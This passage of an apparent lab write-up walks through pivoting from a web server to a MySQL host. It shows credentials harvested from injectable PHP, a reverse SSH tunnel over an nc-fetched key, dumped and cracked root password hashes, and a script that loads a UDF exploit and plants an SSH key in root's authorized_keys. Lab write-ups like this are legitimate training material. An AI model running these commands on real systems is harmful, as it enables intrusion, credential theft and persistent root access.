</span><span class='line'>member.php
</span><span class='line'>register.php
</span><span class='line'>submit.php
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>head login.php
</span><span class='line'>&lt;?php
</span><span class='line'>
</span><span class='line'><span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s2">&quot;username&quot;</span><span class="o">]</span><span class="p">;</span>
</span><span class='line'><span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s2">&quot;password&quot;</span><span class="o">]</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>mysql_connect<span class="o">(</span><span class="s2">&quot;192.168.2.200&quot;</span>, <span class="s2">&quot;webapp&quot;</span>, <span class="s2">&quot;webapp&quot;</span><span class="o">)</span> or die<span class="o">(</span>mysql_error<span class="o">())</span><span class="p">;</span>
</span><span class='line'>mysql_select_db<span class="o">(</span><span class="s2">&quot;webapp&quot;</span><span class="o">)</span> or die<span class="o">(</span>mysql_error<span class="o">())</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where username=&#39;$username&#39; AND password=&#39;$password&#39;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$result</span> <span class="o">=</span> mysql_query<span class="o">(</span><span class="nv">$query</span><span class="o">)</span> or die<span class="o">(</span>mysql_error<span class="o">())</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>/sbin/ifconfig
</span><span class='line'>eth0      Link encap:Ethernet  HWaddr fe:7f:29:91:70:e2
</span><span class='line'>          inet addr:192.168.1.100  Bcast:192.168.1.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::fc7f:29ff:fe91:70e2/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:249 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:166 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000
</span><span class='line'>          RX bytes:38924 <span class="o">(</span>38.0 KiB<span class="o">)</span>  TX bytes:31129 <span class="o">(</span>30.3 KiB<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>eth1      Link encap:Ethernet  HWaddr ba:e4:73:90:79:b3
</span><span class='line'>          inet addr:192.168.2.100  Bcast:192.168.2.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::b8e4:73ff:fe90:79b3/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:119 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:62 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000
</span><span class='line'>          RX bytes:19853 <span class="o">(</span>19.3 KiB<span class="o">)</span>  TX bytes:5341 <span class="o">(</span>5.2 KiB<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Interesting, there is another box that handles the database. From <code>login.php</code>, I harvested some credentials. Let&rsquo;s enable an SSH tunnel to access that second box. I transferred over my SSH key to enable a reverse SSH tunnel (a stupid &amp; dangerous thing to do in a real scenario!):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>nc 10.8.7.1 <span class="m">7777</span> &gt; /tmp/bas <span class="o">&amp;&amp;</span> chmod <span class="m">600</span> /tmp/bas
</span><span class='line'>ls -alh
</span><span class='line'>total 12K
</span><span class='line'>drwxrwxrwt  <span class="m">2</span> root     root     4.0K Sep  <span class="m">4</span> 16:58 .
</span><span class='line'>drwxr-xr-x <span class="m">22</span> root     root     4.0K Aug  <span class="m">9</span> 20:06 ..
</span><span class='line'>-rw-------  <span class="m">1</span> www-data www-data 1.7K Sep  <span class="m">4</span> 16:58 bas
</span><span class='line'>ssh -fN -R 13333:192.168.2.200:3306 -o <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no bas@10.8.7.1 -i /tmp/bas
</span></code></pre></td></tr></table></div></figure>


<p>The <code>ssh</code> command was mind-boggling. <code>-fN</code> asks ssh to not run remote commands and background itself; useful for running tunnels. Then,<code>-R</code> requests a reverse tunnel. <code>13333:192.168.2.200:3306</code> means &ldquo;start a tunnel to <code>192.168.2.200:3306</code> on port 13333&rdquo;. The local host is 10.8.7.1, my own box. Finally, the magic ingredient was <code>-o StrictHostKeyChecking=no</code>, which makes ssh skip the verification. Usually, it will ask &ldquo;add host x to known hosts?&rdquo;. However, since we have a limited reverse shell instead of a proper tty, this will not allow us to type &lsquo;yes&rsquo;. Specifying <code>StrictHostKeyChecking=no</code> circumvents this. This allowed me to access the remote database server via the webserver box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>mysql -h 127.0.0.1 -P <span class="m">13333</span> -u webapp -p
</span><span class='line'>Enter password:
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span><span class='line'>Your MySQL connection id is 42
</span><span class='line'>Server version: 5.5.37-0+wheezy1 <span class="o">(</span>Debian<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2014, Oracle and/or its affiliates. All rights reserved.
</span><span class='line'>
</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.
</span><span class='line'>
</span><span class='line'>Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
</span><span class='line'>
</span><span class='line'>mysql&gt; show databases<span class="p">;</span>
</span><span class='line'>+--------------------+
</span><span class='line'><span class="p">|</span> Database           <span class="p">|</span>
</span><span class='line'>+--------------------+
</span><span class='line'><span class="p">|</span> information_schema <span class="p">|</span>
</span><span class='line'><span class="p">|</span> mysql              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> performance_schema <span class="p">|</span>
</span><span class='line'><span class="p">|</span> webapp             <span class="p">|</span>
</span><span class='line'>+--------------------+
</span><span class='line'><span class="m">4</span> rows in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>mysql&gt; use webapp
</span><span class='line'>Reading table information <span class="k">for</span> completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A
</span><span class='line'>
</span><span class='line'>Database changed
</span><span class='line'>mysql&gt; show tables<span class="p">;</span>
</span><span class='line'>+------------------+
</span><span class='line'><span class="p">|</span> Tables_in_webapp <span class="p">|</span>
</span><span class='line'>+------------------+
</span><span class='line'><span class="p">|</span> todo             <span class="p">|</span>
</span><span class='line'><span class="p">|</span> users            <span class="p">|</span>
</span><span class='line'>+------------------+
</span><span class='line'><span class="m">2</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>mysql&gt; <span class="k">select</span> * from users<span class="p">;</span>
</span><span class='line'>+----------+----------+------+-------+----+
</span><span class='line'><span class="p">|</span> username <span class="p">|</span> password <span class="p">|</span> dob  <span class="p">|</span> admin <span class="p">|</span> id <span class="p">|</span>
</span><span class='line'>+----------+----------+------+-------+----+
</span><span class='line'><span class="p">|</span> bas      <span class="p">|</span> bas      <span class="p">|</span> <span class="m">0</span>    <span class="p">|</span>     <span class="m">1</span> <span class="p">|</span>  <span class="m">1</span> <span class="p">|</span>
</span><span class='line'><span class="p">|</span> bleh     <span class="p">|</span> bleh     <span class="p">|</span> bleh <span class="p">|</span>     <span class="m">0</span> <span class="p">|</span>  <span class="m">2</span> <span class="p">|</span>
</span><span class='line'>+----------+----------+------+-------+----+
</span><span class='line'><span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>mysql&gt; <span class="k">select</span> * from todo<span class="p">;</span>
</span><span class='line'>+----------------------------+
</span><span class='line'><span class="p">|</span> task                       <span class="p">|</span>
</span><span class='line'>+----------------------------+
</span><span class='line'><span class="p">|</span> stop running mysql as root <span class="p">|</span>
</span><span class='line'>+----------------------------+
</span><span class='line'><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>mysql&gt;
</span></code></pre></td></tr></table></div></figure>


<p><code>mysql</code> is running as root? Interesting, maybe it has FILE permissions, too! Further enumeration of the database:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql&gt; use mysql
</span><span class='line'>Reading table information <span class="k">for</span> completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A
</span><span class='line'>
</span><span class='line'>Database changed
</span><span class='line'>mysql&gt; show tables<span class="p">;</span>
</span><span class='line'>+---------------------------+
</span><span class='line'><span class="p">|</span> Tables_in_mysql           <span class="p">|</span>
</span><span class='line'>+---------------------------+
</span><span class='line'><span class="p">|</span> columns_priv              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> db                        <span class="p">|</span>
</span><span class='line'><span class="p">|</span> event                     <span class="p">|</span>
</span><span class='line'><span class="p">|</span> func                      <span class="p">|</span>
</span><span class='line'><span class="p">|</span> general_log               <span class="p">|</span>
</span><span class='line'><span class="p">|</span> help_category             <span class="p">|</span>
</span><span class='line'><span class="p">|</span> help_keyword              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> help_relation             <span class="p">|</span>
</span><span class='line'><span class="p">|</span> help_topic                <span class="p">|</span>
</span><span class='line'><span class="p">|</span> host                      <span class="p">|</span>
</span><span class='line'><span class="p">|</span> ndb_binlog_index          <span class="p">|</span>
</span><span class='line'><span class="p">|</span> plugin                    <span class="p">|</span>
</span><span class='line'><span class="p">|</span> proc                      <span class="p">|</span>
</span><span class='line'><span class="p">|</span> procs_priv                <span class="p">|</span>
</span><span class='line'><span class="p">|</span> proxies_priv              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> servers                   <span class="p">|</span>
</span><span class='line'><span class="p">|</span> slow_log                  <span class="p">|</span>
</span><span class='line'><span class="p">|</span> tables_priv               <span class="p">|</span>
</span><span class='line'><span class="p">|</span> time_zone                 <span class="p">|</span>
</span><span class='line'><span class="p">|</span> time_zone_leap_second     <span class="p">|</span>
</span><span class='line'><span class="p">|</span> time_zone_name            <span class="p">|</span>
</span><span class='line'><span class="p">|</span> time_zone_transition      <span class="p">|</span>
</span><span class='line'><span class="p">|</span> time_zone_transition_type <span class="p">|</span>
</span><span class='line'><span class="p">|</span> user                      <span class="p">|</span>
</span><span class='line'>+---------------------------+
</span><span class='line'><span class="m">24</span> rows in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>mysql&gt; <span class="k">select</span> * from user<span class="p">;</span>
</span><span class='line
</span><span class='line'><span class="p">|</span> Host          <span class="p">|</span> User             <span class="p">|</span> Password                                  <span class="p">|</span> Select_priv <span class="p">|</span> Insert_priv <span class="p">|</span> Update_priv <span class="p">|</span> Delete_priv <span class="p">|</span> Create_priv <span class="p">|</span> Drop_priv <span class="p">|</span> Reload_priv <span class="p">|</span> Shutdown_priv <span class="p">|</span> Process_priv <span class="p">|</span> File_priv <span class="p">|</span> Grant_priv <span class="p">|</span> References_priv <span class="p">|</span> Index_priv <span class="p">|</span> Alter_priv <span class="p">|</span> Show_db_priv <span class="p">|</span> Super_priv <span class="p">|</span> Create_tmp_table_priv <span class="p">|</span> Lock_tables_priv <span class="p">|</span> Execute_priv <span class="p">|</span> Repl_slave_priv <span class="p">|</span> Repl_client_priv <span class="p">|</span> Create_view_priv <span class="p">|</span> Show_view_priv <span class="p">|</span> Create_routine_priv <span class="p">|</span> Alter_routine_priv <span class="p">|</span> Create_user_priv <span class="p">|</span> Event_priv <span class="p">|</span> Trigger_priv <span class="p">|</span> Create_tablespace_priv <span class="p">|</span> ssl_type <span class="p">|</span> ssl_cipher <span class="p">|</span> x509_issuer <span class="p">|</span> x509_subject <span class="p">|</span> max_questions <span class="p">|</span> max_updates <span class="p">|</span> max_connections <span class="p">|</span> max_user_connections <span class="p">|</span> plugin <span class="p">|</span> authentication_string <span class="p">|</span>
</span><span class='line
</span><span class='line'><span class="p">|</span> localhost     <span class="p">|</span> root             <span class="p">|</span> *ECB01D78C2FBEE997EDA584C647183FD99C115FD <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y         <span class="p">|</span> Y           <span class="p">|</span> Y             <span class="p">|</span> Y            <span class="p">|</span> Y         <span class="p">|</span> Y          <span class="p">|</span> Y               <span class="p">|</span> Y          <span class="p">|</span> Y          <span class="p">|</span> Y            <span class="p">|</span> Y          <span class="p">|</span> Y                     <span class="p">|</span> Y                <span class="p">|</span> Y            <span class="p">|</span> Y               <span class="p">|</span> Y                <span class="p">|</span> Y                <span class="p">|</span> Y              <span class="p">|</span> Y                   <span class="p">|</span> Y                  <span class="p">|</span> Y                <span class="p">|</span> Y          <span class="p">|</span> Y            <span class="p">|</span> Y                      <span class="p">|</span>          <span class="p">|</span>            <span class="p">|</span>             <span class="p">|</span>              <span class="p">|</span>             <span class="m">0</span> <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span>               <span class="m">0</span> <span class="p">|</span>                    <span class="m">0</span> <span class="p">|</span>        <span class="p">|</span>                       <span class="p">|</span>
</span><span class='line'><span class="p">|</span> db            <span class="p">|</span> root             <span class="p">|</span> *ECB01D78C2FBEE997EDA584C647183FD99C115FD <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y         <span class="p">|</span> Y           <span class="p">|</span> Y             <span class="p">|</span> Y            <span class="p">|</span> Y         <span class="p">|</span> Y          <span class="p">|</span> Y               <span class="p">|</span> Y          <span class="p">|</span> Y          <span class="p">|</span> Y            <span class="p">|</span> Y          <span class="p">|</span> Y                     <span class="p">|</span> Y                <span class="p">|</span> Y            <span class="p">|</span> Y               <span class="p">|</span> Y                <span class="p">|</span> Y                <span class="p">|</span> Y              <span class="p">|</span> Y                   <span class="p">|</span> Y                  <span class="p">|</span> Y                <span class="p">|</span> Y          <span class="p">|</span> Y            <span class="p">|</span> Y                      <span class="p">|</span>          <span class="p">|</span>            <span class="p">|</span>             <span class="p">|</span>              <span class="p">|</span>             <span class="m">0</span> <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span>               <span class="m">0</span> <span class="p">|</span>                    <span class="m">0</span> <span class="p">|</span>        <span class="p">|</span>                       <span class="p">|</span>
</span><span class='line'><span class="p">|</span> 127.0.0.1     <span class="p">|</span> root             <span class="p">|</span> *ECB01D78C2FBEE997EDA584C647183FD99C115FD <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y         <span class="p">|</span> Y           <span class="p">|</span> Y             <span class="p">|</span> Y            <span class="p">|</span> Y         <span class="p">|</span> Y          <span class="p">|</span> Y               <span class="p">|</span> Y          <span class="p">|</span> Y          <span class="p">|</span> Y            <span class="p">|</span> Y          <span class="p">|</span> Y                     <span class="p">|</span> Y                <span class="p">|</span> Y            <span class="p">|</span> Y               <span class="p">|</span> Y                <span class="p">|</span> Y                <span class="p">|</span> Y              <span class="p">|</span> Y                   <span class="p">|</span> Y                  <span class="p">|</span> Y                <span class="p">|</span> Y          <span class="p">|</span> Y            <span class="p">|</span> Y                      <span class="p">|</span>          <span class="p">|</span>            <span class="p">|</span>             <span class="p">|</span>              <span class="p">|</span>             <span class="m">0</span> <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span>               <span class="m">0</span> <span class="p">|</span>                    <span class="m">0</span> <span class="p">|</span>        <span class="p">|</span>                       <span class="p">|</span>
</span><span class='line'><span class="p">|</span> ::1           <span class="p">|</span> root             <span class="p">|</span> *ECB01D78C2FBEE997EDA584C647183FD99C115FD <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y         <span class="p">|</span> Y           <span class="p">|</span> Y             <span class="p">|</span> Y            <span class="p">|</span> Y         <span class="p">|</span> Y          <span class="p">|</span> Y               <span class="p">|</span> Y          <span class="p">|</span> Y          <span class="p">|</span> Y            <span class="p">|</span> Y          <span class="p">|</span> Y                     <span class="p">|</span> Y                <span class="p">|</span> Y            <span class="p">|</span> Y               <span class="p">|</span> Y                <span class="p">|</span> Y                <span class="p">|</span> Y              <span class="p">|</span> Y                   <span class="p">|</span> Y                  <span class="p">|</span> Y                <span class="p">|</span> Y          <span class="p">|</span> Y            <span class="p">|</span> Y                      <span class="p">|</span>          <span class="p">|</span>            <span class="p">|</span>             <span class="p">|</span>              <span class="p">|</span>             <span class="m">0</span> <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span>               <span class="m">0</span> <span class="p">|</span>                    <span class="m">0</span> <span class="p">|</span>        <span class="p">|</span>                       <span class="p">|</span>
</span><span class='line'><span class="p">|</span> localhost     <span class="p">|</span> debian-sys-maint <span class="p">|</span> *E0E0871376896664A590151D348CCE9AA800435B <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y         <span class="p">|</span> Y           <span class="p">|</span> Y             <span class="p">|</span> Y            <span class="p">|</span> Y         <span class="p">|</span> Y          <span class="p">|</span> Y               <span class="p">|</span> Y          <span class="p">|</span> Y          <span class="p">|</span> Y            <span class="p">|</span> Y          <span class="p">|</span> Y                     <span class="p">|</span> Y                <span class="p">|</span> Y            <span class="p">|</span> Y               <span class="p">|</span> Y                <span class="p">|</span> Y                <span class="p">|</span> Y              <span class="p">|</span> Y                   <span class="p">|</span> Y                  <span class="p">|</span> Y                <span class="p">|</span> Y          <span class="p">|</span> Y            <span class="p">|</span> Y                      <span class="p">|</span>          <span class="p">|</span>            <span class="p">|</span>             <span class="p">|</span>              <span class="p">|</span>             <span class="m">0</span> <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span>               <span class="m">0</span> <span class="p">|</span>                    <span class="m">0</span> <span class="p">|</span>        <span class="p">|</span> NULL                  <span class="p">|</span>
</span><span class='line'><span class="p">|</span> 192.168.2.100 <span class="p">|</span> webapp           <span class="p">|</span> *BF7C27E734F86F28A9386E9759D238AFB863BDE3 <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> N           <span class="p">|</span> N           <span class="p">|</span> N           <span class="p">|</span> N         <span class="p">|</span> N           <span class="p">|</span> N             <span class="p">|</span> N            <span class="p">|</span> N         <span class="p">|</span> N          <span class="p">|</span> N               <span class="p">|</span> N          <span class="p">|</span> N          <span class="p">|</span> N            <span class="p">|</span> N          <span class="p">|</span> N                     <span class="p">|</span> N                <span class="p">|</span> N            <span class="p">|</span> N               <span class="p">|</span> N                <span class="p">|</span> N                <span class="p">|</span> N              <span class="p">|</span> N                   <span class="p">|</span> N                  <span class="p">|</span> N                <span class="p">|</span> N          <span class="p">|</span> N            <span class="p">|</span> N                      <span class="p">|</span>          <span class="p">|</span>            <span class="p">|</span>             <span class="p">|</span>              <span class="p">|</span>             <span class="m">0</span> <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span>               <span class="m">0</span> <span class="p">|</span>                    <span class="m">0</span> <span class="p">|</span>        <span class="p">|</span> NULL                  <span class="p">|</span>
</span><span class='line'><span class="p">|</span> 192.168.2.100 <span class="p">|</span> root             <span class="p">|</span> *ECB01D78C2FBEE997EDA584C647183FD99C115FD <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y           <span class="p">|</span> Y         <span class="p">|</span> Y           <span class="p">|</span> Y             <span class="p">|</span> Y            <span class="p">|</span> Y         <span class="p">|</span> Y          <span class="p">|</span> Y               <span class="p">|</span> Y          <span class="p">|</span> Y          <span class="p">|</span> Y            <span class="p">|</span> Y          <span class="p">|</span> Y                     <span class="p">|</span> Y                <span class="p">|</span> Y            <span class="p">|</span> Y               <span class="p">|</span> Y                <span class="p">|</span> Y                <span class="p">|</span> Y              <span class="p">|</span> Y                   <span class="p">|</span> Y                  <span class="p">|</span> Y                <span class="p">|</span> Y          <span class="p">|</span> Y            <span class="p">|</span> Y                      <span class="p">|</span>          <span class="p">|</span>            <span class="p">|</span>             <span class="p">|</span>              <span class="p">|</span>             <span class="m">0</span> <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span>               <span class="m">0</span> <span class="p">|</span>                    <span class="m">0</span> <span class="p">|</span>        <span class="p">|</span> NULL                  <span class="p">|</span>
</span><span class='line
</span><span class='line'><span class="m">7</span> rows in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Aha, the hashed password of the root user! Googling for the <a href="http://sha1.znaet.org/sha1/ecb01d78c2fbee997eda584c647183fd99c115fd">hash of the root user</a> landed the password <code>coolwater</code>. Sweet! Next, I wanted to run <em>shell</em> commands as the root user, but for that we need something like <a href="https://github.com/mysqludf/lib_mysqludf_sys">lib_mysqludf_sys</a>. Luckily, the root user has ALL permissions and therefore should be able to create files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>mysql -h 127.0.0.1 -P <span class="m">13333</span> -u root -pcoolwater
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span><span class='line'>Your MySQL connection id is 43
</span><span class='line'>Server version: 5.5.37-0+wheezy1 <span class="o">(</span>Debian<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2014, Oracle and/or its affiliates. All rights reserved.
</span><span class='line'>
</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.
</span><span class='line'>
</span><span class='line'>Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
</span><span class='line'>
</span><span class='line'>mysql&gt; show grants<span class="p">;</span>
</span><span class='line'>+--------------------------------------------------------------------------------------------------------------------------------------------+
</span><span class='line'><span class="p">|</span> Grants <span class="k">for</span> root@192.168.2.100                                                                                                              <span class="p">|</span>
</span><span class='line'>+--------------------------------------------------------------------------------------------------------------------------------------------+
</span><span class='line'><span class="p">|</span> GRANT ALL PRIVILEGES ON *.* TO <span class="s1">&#39;root&#39;</span>@<span class="s1">&#39;192.168.2.100&#39;</span> IDENTIFIED BY PASSWORD <span class="s1">&#39;*ECB01D78C2FBEE997EDA584C647183FD99C115FD&#39;</span> WITH GRANT OPTION <span class="p">|</span>
</span><span class='line'>+--------------------------------------------------------------------------------------------------------------------------------------------+
</span><span class='line'><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Without going into detail, I made a script that uploaded <code>lib_mysql_udf</code> to the remote server. After registering the right command, this allowed me to run commands. In one go, the script builds the SQL command to install <code>lib_mysql_udf</code> and adds my public key to the authorized SSH keys of the root user:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'>
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;SELECT 0x&quot;</span> &gt; payload
</span><span class='line'>cat lib_mysqludf_sys.so <span class="p">|</span>xxd -p &gt;&gt; payload
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot; INTO DUMPFILE &#39;/usr/lib/mysql/plugin/udf_exploit.so&#39;; &quot;</span> &gt;&gt; payload
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;DROP FUNCTION IF EXISTS sys_exec; &quot;</span> &gt;&gt; payload
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;CREATE FUNCTION sys_exec RETURNS int SONAME &#39;udf_exploit.so&#39;; &quot;</span> &gt;&gt; payload
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;SELECT &#39;&quot;</span> &gt;&gt; payload
</span><span class='line'>cat ~/.ssh/id_rsa.pub &gt;&gt; payload
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;&#39; INTO OUTFILE \&quot;/root/.ssh/authorized_keys\&quot;; &quot;</span> &gt;&gt; payload
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;SELECT sys_exec(\&quot;chmod 600 /root/.ssh/authorized_keys\&quot;); &quot;</span> &gt;&gt; payload
</span><span class='line'>
</span><span class='line'>cat payload <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span> &gt; payload2
</span><span class='line'>rm payload
